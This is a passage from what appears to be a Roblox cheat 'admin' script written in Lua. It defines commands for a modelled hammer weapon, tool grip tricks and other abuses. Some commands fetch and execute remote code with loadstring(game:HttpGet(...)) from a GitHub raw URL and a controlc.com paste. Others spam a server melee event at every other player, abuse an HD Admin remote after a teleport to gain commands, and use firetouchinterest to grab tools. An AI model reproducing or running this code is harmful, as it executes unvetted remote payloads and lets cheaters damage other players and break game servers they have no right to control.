        sound.Pitch = pitch or 1
        coroutine.wrap(function()
                wait()
                sound:Play()
                wait(10)
                sound:Stop()
                sound:Destroy()
        end)()
        return sound
end

local plr = game.Players.LocalPlayer
local char = plr.Character
local mouse = plr:GetMouse()

local nk = char.Torso.Neck
local nk0 = CFrame.new(0,1,0) * CFrame.Angles(-math.pi/2,0,math.pi)
local ra,la = char["Right Arm"], char["Left Arm"]
ra:BreakJoints()
la:BreakJoints()
local rs = weld(char.Torso,ra,CFrame.new(1.25,.5,0), CFrame.new(-.25,.5,0),stuff)
local ls = weld(char.Torso,la,CFrame.new(-1.25,.5,0), CFrame.new(.25,.5,0),stuff)
ls.Part1.FrontSurface = "Hinge"
rs.Part1.FrontSurface = "Hinge"
local rs0 = rs.C0
local ls0 = ls.C0

local color1 = BrickColor.new("Dark gray")
local color2 = BrickColor.new("Navy blue")

local stuff = Instance.new("Model",char)
pcall(function() char["Hammur"]:Destroy() end)
stuff.Name = "Hammur"
wait(.5)
local handle = Instance.new("Part")
handle.FormFactor = "Custom"
handle.BrickColor = color1
handle.Reflectance = .25
handle.Size = Vector3.new(.5,5,.5)
handle.TopSurface = "Smooth"
handle.BottomSurface = "Smooth"
handle.CanCollide = false
handle.Parent = stuff

local grip = weld(char["Right Arm"],handle,CFrame.new(0,-.95,0)*CFrame.Angles(math.rad(-90),0,0),CFrame.new(0,-1.4,0)) 
local grip0 = grip.C0
local hamend = handle:Clone()
Instance.new("BlockMesh",hamend)
hamend.Parent = stuff
hamend.Size = Vector3.new(2,2,3.5)
local hamwel = weld(handle,hamend,CFrame.new(0,3,0))
local hamsd1 = hamend:Clone()
hamsd1.Mesh.Scale = Vector3.new(1,1,1)
hamsd1.Parent = stuff
hamsd1.Size = Vector3.new(2.3,2.3,.3)
weld(hamend,hamsd1,CFrame.new(0,0,1.75))
local hamsd2 = hamsd1:Clone()
hamsd2.Parent = stuff
weld(hamend,hamsd2,CFrame.new(0,0,-1.75))
local hamp = hamsd1:Clone()
hamp.Parent = stuff
hamp.Size = Vector3.new(.2,.2,3.5)
weld(hamend,hamp,CFrame.new(.95,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,.95,0))
hamp = hamp:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,2.5)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,0,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,0,0))
hamp = handle:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Parent = stuff
hamp.Size = Vector3.new(.4,.2,.4)
Instance.new("CylinderMesh",hamp)
weld(hamend,hamp,CFrame.new(0,-.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
local luacyl = hamp:Clone()
luacyl.BrickColor = BrickColor.Blue()
luacyl.Parent = stuff
luacyl.Mesh.Scale = Vector3.new(1,.2,1)
luacyl.Size = Vector3.new(2,.2,2)
weld(hamsd1,luacyl,CFrame.new(0,0,.14) * CFrame.Angles(math.rad(90),0,0))
hamp = luacyl:Clone()
hamp.BrickColor = BrickColor.White()
hamp.Parent = stuff
hamp.Size = Vector3.new(.7,.2,.7)
weld(luacyl,hamp,CFrame.new(.35,.01,-.35))
local luamoon = luacyl:Clone()
luamoon.Parent = stuff
luamoon.Size = Vector3.new(.7,.2,.7)
local mnw = weld(luacyl,luamoon,CFrame.new(1.2,.02,-1.2))
for r = 1,180,10 do
        local r2 = 2 * (math.pi/180*r)
        local l = hamsd1:Clone()
        l.Parent = stuff
        l.BrickColor = luacyl.BrickColor
        l.Size = Vector3.new(.3,.2,.2)
        l.Mesh.Scale = Vector3.new(1,.3,.3)
        weld(luacyl,l,CFrame.new(Vector3.new(math.sin(r2)*1.7,0,math.cos(r2)*1.7),Vector3.new()))
end
hamp = hamend:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,3.5)
hamp.Mesh.Scale = Vector3.new(.25,.25,1)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-1.05,0))
for x = -1,1 do
for y = -1,1 do
hamp = hamp:Clone()
hamp.Mesh.Scale = Vector3.new(1,1,1)
hamp.Size = Vector3.new(.5,.5,.2)
hamp.Parent = stuff
weld(hamsd2,hamp,CFrame.new(x*.7,y*.7,-.1))
end
end

rs.C0 = rs0 * CFrame.Angles(math.rad(70),math.rad(50),math.rad(-20))
ls.C0 = ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(110),math.rad(0),math.rad(00)) * CFrame.Angles(0,math.rad(60),0)

function endScript()
        pcall(function() runcon:disconnect() end)
        pcall(function() kdcon:disconnect() end)
        pcall(function() kucon:disconnect() end)
        pcall(game.Destroy,stuff)
        pcall(game.Destroy,bg)
        pcall(game.Destroy,bv)
end

local spintime = 3
local idling = true

runcon = game:GetService("RunService").Stepped:connect(oc(function()
        if not stuff:IsDescendantOf(workspace) then
                endScript()
        end
        local an = (tick()%spintime)*360/spintime
        mnw.C0 = CFrame.Angles(0,math.rad(an),0) * CFrame.new(0,.04,1.7)
        if idling then
                rs.C0 = clerp(rs.C0,rs0 * CFrame.Angles(math.rad(70+tickwave(3,5)),math.rad(50),math.rad(-20)),.4)
                ls.C0 = clerp(ls.C0,ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(115+tickwave(3,5)),math.rad(0),math.rad(-5)) * CFrame.Angles(0,math.rad(60),0),.4)
                nk.C0 = clerp(nk.C0,nk0 * CFrame.Angles(tickwave(4,-.1),0,0),.4)
                grip.C0 = clerp(grip.C0,grip0,.4)
        end
end))

function cfot(tar,cf,t)
        coroutine.wrap(function()
                for i=1,t do
                        tar.CFrame = tar.CFrame * cf
                        wait(1/30)
                end
        end)()
end

function DoDamage(hum,dmg)
        if hum.Health == 0 then   for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
        end
end return end
        local a,b = ypcall(function()
                --hum:TakeDamage(dmg)
                hum.Health = hum.Health - dmg
                if not hum.Parent:FindFirstChild("Torso") then return end
                local m = Instance.new("Model",workspace)
                m.Name = -dmg
                local h = Instance.new("Humanoid",m)
                h.MaxHealth = 0
                local p = Instance.new("Part",m)
                p.Name = "Head"
                p.FormFactor = "Custom"
                p.Size = Vector3.new(.2,.2,.2)
                p.Transparency = 0.97
                p.CanCollide = false
                p.Anchored = true
                p:BreakJoints()
                game.Debris:AddItem(m,5)
                p.CFrame = CFrame.new(hum.Parent.Torso.Position) * CFrame.new(math.random(-2,2),2.5,math.random(-2,2))
                local rAm = math.random(3,6)/100
                coroutine.wrap(function()
                for i=1,300 do 
                p.CFrame = p.CFrame * CFrame.new(0,rAm,0) 
                wait()
                end 
                p:Destroy()
                end)()
        end)
        if not a then print(b) end
end

local atdeb = false
local basiccombo = 0
local basiccombotimer = 0
bg = Instance.new("BodyGyro",char.Torso)
bg.maxTorque = Vector3.new(1,0,1)*9e10
bg.P = 10000
bg.D = 500
bv = Instance.new("BodyVelocity",char.Torso)
bv.maxForce = Vector3.new()
bv.P = 50000

kucon = mouse.KeyUp:connect(oc(function(k)
        if k == "0" and sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed / 1.5 end)
                sprint = false
        end
end))

kdcon = mouse.KeyDown:connect(oc(function(k)
        if k == "0" and not sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed * 1.5 end)
                sprint = true
        end
        if k == "f" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
             ---   bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
               -- ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-90)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(60)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(30)),4,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(35),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(-30)),4)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "q" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-30),math.rad(-25),math.rad(-15)),9,true)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(30)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-30)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(-30)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                wait(.05)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(-20),0,0)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(55),math.rad(5),math.rad(50)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(5),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.9,0,-.9) * CFrame.Angles(math.rad(50),math.rad(5),math.rad(-50)),7)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "r" then
                if atdeb then return end
                atdeb = true
                idling = false
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(30)),7,true)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(0),math.rad(90),math.rad(-60))*CFrame.Angles(0,math.rad(180),0),9,true)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                bg.cframe = char.Torso.CFrame
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(-30)),7,true)
                local s = playSound(92597296,hamend,1,1.07)
                s.Looped = true
                local sndmd = {}
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        if not sndmd[hit] then sndmd[hit] = playSound(10730819,hamend) end
                        
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*60
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,math.random(4,6))
                                hum.Sit = true
                                wait(2)
                                hum.Sit = false
                        end
                end)
                for i=1,20 do
                        bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(-1440/20),0)
                        wait(.1)
                end
                hitcon:disconnect()
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                s:Stop()
                s:Destroy()
                atdeb = false
                idling = true
        end
        if k == "e" then
                if atdeb then return end
                basiccombo = (tick()-basiccombotimer > .5 or basiccombo == 2) and 1 or basiccombo + 1
                idling = false
                atdeb = true
                if basiccombo == 1 then
                        ctween(ls,"C0",ls0 * CFrame.new(.2,.2,-.1) * CFrame.Angles(math.rad(120),math.rad(0),math.rad(5)) * CFrame.Angles(0,math.rad(60),0),7,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(70),math.rad(-30)),7)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(-40),0)
                        playSound(92597296,hamend,1,1.2)
                        local ac
                        local hitcon
                        hitcon = hamend.Touched:connect(function(hit)
                                if not ac then ac = playSound(10730819,hamend,1,1) end
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*50
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
                                        DoDamage(hum,10)
                                end
                        end)
                        ctween(ls,"C0",ls0 * CFrame.new(1,.2,-1) * CFrame.Angles(math.rad(115),math.rad(0),math.rad(40)) * CFrame.Angles(0,math.rad(60),0),6,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(80),math.rad(-30))* CFrame.Angles(math.rad(-50),0,0),6,true)
                        wait(.1)
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(40),0)
                        hitcon:disconnect()
                elseif basiccombo == 2 then
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(5),math.rad(0),math.rad(70)),10,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(10),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,0) * CFrame.Angles(math.rad(-5),math.rad(0),math.rad(0)),10,true)
                        wait(.2)
                        playSound(92597296,hamend,1,.7)
                        wait(.1)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame
                        bv.maxForce = Vector3.new(1,0,1)*9e5
                        bv.velocity = bg.cframe.lookVector * 70
                        coroutine.wrap(function() for i=1,25 do bv.velocity = bv.velocity*.9 wait(1/30) end bv.maxForce = Vector3.new() end)()
                        local thrustcon
                        thrustcon = hamend.Touched:connect(function(hit)
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-40
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
                                        DoDamage(hum,5)
                                        --thrustcon:disconnect()
                                        hum.Sit = true
                                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(30),0,0),5,true)
                                        if not ac then ac = playSound(92597296,hamend,1,1.15) end
                                        local tor = hum.Parent:FindFirstChild("Torso")
                                        if tor and not tor:FindFirstChild("torv") then
                                                --tor.Velocity = bg.cframe.lookVector*30 + Vector3.new(0,100,0)
                                                local torv = Instance.new("BodyVelocity",tor)
                                                torv.maxForce = Vector3.new(1,1,1)*9e9
                                                torv.P = 2000
                                                torv.velocity = bg.cframe.lookVector*20 + Vector3.new(0,120,0)
                                                torv.Name = "torv"
                                                local torav = Instance.new("BodyAngularVelocity",tor)
                                                torav.maxTorque = Vector3.new(1,1,1)*9e9
                                                torav.P = 5000
                                                torav.angularvelocity = Vector3.new(math.random()-.5,math.random()-.5,math.random()-.5)*2
                                                coroutine.wrap(function() 
                                                        for i=1,torv.velocity.Y/196.22*30 do
                                                                hum.Sit = true
                                                                torv.velocity = torv.velocity - Vector3.new(0,196.22/30,0) 
                                                                wait(1/30) 
                                                        end 
                                                        torv:Destroy() 
                                                        torav:Destroy()
                                                        tor.Velocity = Vector3.new()
                                                end)()
                                        end
                                end
                        end)
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(80),math.rad(0),math.rad(50)),12,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-70),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(-.6,0,-.7) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-10)),12,true)
                        Delay(.3,function() thrustcon:disconnect() end)
                        
                end
                wait(.1)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                
                basiccombotimer = tick()
                atdeb = false
                idling = true
                
        end -- 96626016, 92597296
        bg.cframe = CFrame.new(char.Torso.Position,char.Torso.Position+char.Torso.CFrame.lookVector*Vector3.new(1,0,1))
end))

char.Humanoid.MaxHealth = 220
char.Humanoid.WalkSpeed = 20
wait(.3)
char.Humanoid.Health = 220
end)
AddCmd('Gun','',function()

local Handles = {
    CFrame.new(0, -1, 0),
    CFrame.new(0, 0, 0),
    CFrame.new(0, -1, 1),
    CFrame.new(0, -1, 2),
    CFrame.new(0, -1, 2),
        CFrame.new(0, -1, 2),
    
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then


v.Grip = Handles[i-1] 
v.Parent = game.Players.LocalPlayer.Character
end
end 

end)
AddCmd('Harked','',function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/loliskind33/er2r/main/h",true))()
end)
AddCmd('GrabknifeV4','',function()
loadstring(game:HttpGet("https://controlc.com/c78a1b60/",true))()
end)
AddCmd('grabknifev4','',function()
loadstring(game:HttpGet("https://controlc.com/c78a1b60/",true))()
end)
AddCmd('getalltools','',function()
for _,v in pairs(workspace:GetDescendants()) do
if v:IsA("TouchTransmitter") and v:IsA("Tool") then
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
wait()
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
end
end
end)
AddCmd('Getalltools','',function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("HooperBin") or v:IsA("Tool") then

v.Parent = game.Players.LocalPlayer.Backpack
end
end
end)
AddCmd('InsertHD','',function()
game.StarterGui:SetCore("SendNotification", {
Title = "Loaf's Admin"; -- the title (ofc)
Text = "Inserted HD - Finished!"; -- what the text says (ofc)
Icon = "rbxassetid://1204881901"; -- the image if u want. 
Duration = 5; -- how long the notification should in secounds
})
end)
AddCmd('RankHD','',function()
local plr = game.Players.LocalPlayer
local old = plr.Character.HumanoidRootPart.CFrame

plr.Character.HumanoidRootPart.CFrame = CFrame.new(-855.818298, 135.992508, -989.038208, -1.1920929e-07, 0, 1.00000012, 0, 1, 0, -1.00000012, 0, -1.1920929e-07) -- where you teleport
wait(0.00)
plr.Character.HumanoidRootPart.CFrame = old -- teleports you back to your old position
wait(0.1)
game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(":r6 me")
wait(0.1)
game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(":give me b")
end)
AddCmd('Chair','',function()
local Handles = {
CFrame.new(0.5, 3.5, -2.5),
CFrame.new(2, 2.5, -2),
CFrame.new(2, 2.5, -2.5),
CFrame.new(2.5, 2.5, -2),
CFrame.new(2.5, 2.5, -0.5),
CFrame.new(0.5, 1.5, -2.5),
CFrame.new(1, 2.5, -2),
CFrame.new(1, 2.5, -0.5),
CFrame.new(0.5, 2.5, -2),
CFrame.new(2, 0.5, -2.5),
CFrame.new(0.5, 3.5, -0.5),
CFrame.new(1.5, 2.5, -1),
CFrame.new(1, 1.5, -2.5),
CFrame.new(2.5, 2.5, -1),
CFrame.new(2.5, 2.5, -1.5),
CFrame.new(0.5, 0.5, -2.5),
CFrame.new(1, 0.5, -2.5),
CFrame.new(2, 2.5, -0.5),
CFrame.new(1, 2.5, -1),
CFrame.new(0.5, 2.5, -1.5),
CFrame.new(2, 2.5, -1),
CFrame.new(1.5, 2.5, -1.5),
CFrame.new(0.5, 2.5, -1),
CFrame.new(1.5, 0.5, -2.5),
CFrame.new(1.5, 2.5, -2),
CFrame.new(2, 2.5, -1.5),
CFrame.new(2.5, 1.5, -2.5),
CFrame.new(1.5, 2.5, -0.5),
CFrame.new(0.5, 2.5, -0.5),
CFrame.new(2.5, 3.5, -2.5),
CFrame.new(2.5, 0.5, -2.5),
CFrame.new(2.5, 3.5, -0.5),
CFrame.new(0.5, 2.5, -2.5),
CFrame.new(1.5, 2.5, -2.5),
CFrame.new(2, 1.5, -2.5),
CFrame.new(1, 2.5, -2.5),
CFrame.new(1.5, 1.5, -2.5),
CFrame.new(2.5, 2.5, -2.5),
CFrame.new(1, 2.5, -1.5),





}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 
end)
AddCmd('Hammer','',function()
--[[
--Keybinds--
F - Slash
R - OverHead
L - Slash2
]]--

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

bind = "f" -- has to be lowercase
bind2 = "r"
bind3 = "l"
mouse.KeyDown:connect(function(key)
if key == bind then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94161088"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
--2TH KEYBIND--

mouse.KeyDown:connect(function(key)
if key == bind2 then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94160738"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
--3TH KEYBIND--

mouse.KeyDown:connect(function(key)
if key == bind3 then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94161333"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)

local Handles = {
CFrame.new(-2, -6.8000030517578125, 1.999999761581421),
CFrame.new(1.0000001192092896, -4.400008678436279, 2),
CFrame.new(-1.3113415775478643e-07, -3.4000086784362793, -3),
CFrame.new(2, -4.400008678436279, 2),
CFrame.new(-0.9999999403953552, -6.8000030517578125, 0.9999998807907104),
CFrame.new(-2, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -6.8000030517578125, 0.9999998807907104),
CFrame.new(-0.9999998807907104, -3.4000086784362793, 3),
CFrame.new(1, -3.4000091552734375, 5.2453366095051024e-08),
CFrame.new(-8.742278367890322e-08, -6.8000030517578125, -2.000000238418579),
CFrame.new(0.9999999403953552, -3.4000086784362793, -0.9999999403953552),
CFrame.new(0.9999999403953552, -5.600006103515625, -2),
CFrame.new(2, -5.600006103515625, -2),
CFrame.new(-8.74227694680485e-08, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-2, -6.8000030517578125, -4),
CFrame.new(-1.999999761581421, -5.600006103515625, 4),
CFrame.new(2, -4.400008678436279, -4),
CFrame.new(-2, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(-0.9999999403953552, -3.4000086784362793, 2),
CFrame.new(2, -3.4000091552734375, 1.0000001192092896),
CFrame.new(0.9999999403953552, -4.400008678436279, -1),
CFrame.new(1.0000001192092896, -4.400008678436279, 3),
CFrame.new(-0.5, -2.200010299682617, 2.2292768164788868e-07),
CFrame.new(-0.9999998211860657, -6.8000030517578125, 3.999999761581421),
CFrame.new(2, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(-1, -3.4000086784362793, -0.9999998211860657),
CFrame.new(1, -5.600006103515625, 0.9999998211860657),
CFrame.new(8.742277657347586e-08, -5.600006103515625, 2),
CFrame.new(-2, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(8.789135733230577e-15, -2.200010299682617, 2.0107198395180603e-07),
CFrame.new(-0.9999999403953552, -4.4000091552734375, 1),
CFrame.new(1.3113415775478643e-07, -6.8000030517578125, 2.999999761581421),
CFrame.new(1.7484555314695172e-07, -4.400008678436279, 4),
CFrame.new(-1.0000001192092896, -5.600006103515625, -4),
CFrame.new(-2, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-1.7484555314695172e-07, -4.400008678436279, -4),
CFrame.new(0.9999998211860657, -4.400008678436279, -4),
CFrame.new(1, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1, -6.8000030517578125, -1.000000238418579),
CFrame.new(-1, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(1, -4.4000091552734375, -3.4969410478424834e-08),
CFrame.new(1.3113415775478643e-07, -4.400008678436279, 3),
CFrame.new(-2, -5.600006103515625, 0.9999999403953552),
CFrame.new(-1.999999761581421, -4.400008678436279, 4),
CFrame.new(4.371138118131057e-08, -6.8000030517578125, 0.9999998211860657),
CFrame.new(1, -5.600006103515625, -1.3987650504532212e-07),
CFrame.new(-1.999999761581421, -3.4000086784362793, 4),
CFrame.new(0.9999999403953552, -3.4000086784362793, -1.9999998807907104),
CFrame.new(1.0000001192092896, -6.8000030517578125, 2.999999761581421),
CFrame.new(1.7484555314695172e-07, -5.600006103515625, 4),
